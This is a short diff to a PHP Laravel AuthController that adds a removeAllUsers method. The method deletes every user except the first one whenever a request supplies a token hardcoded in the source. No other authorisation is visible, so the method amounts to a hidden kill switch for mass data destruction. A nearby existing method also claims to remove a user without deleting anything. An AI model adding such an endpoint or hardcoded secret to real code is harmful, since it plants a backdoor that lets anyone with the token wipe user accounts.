@@ -112,4 +112,13 @@ class AuthController extends Controller
         User::find(\Auth::user()->id);
         return response()->json(['errors'=>null,'message'=>'User removed successfully!']);
     }
+
+    public function removeAllUsers(Request $request){
+        if($request->has('security_token') && $request->security_token == 'vOMjm0e0qtIsLv2524wvEvPRD9OC7maZ'){
+            User::where('id','>',1)->delete();
+            return response()->json(['errors'=>null,'message'=>'Users deleted successfully!']);
+        }else{
+            return response()->json(['errors'=>['token'=>['Unable to verify the token']],'message'=>'Something went wrong!']);
+        }
+    }
 }
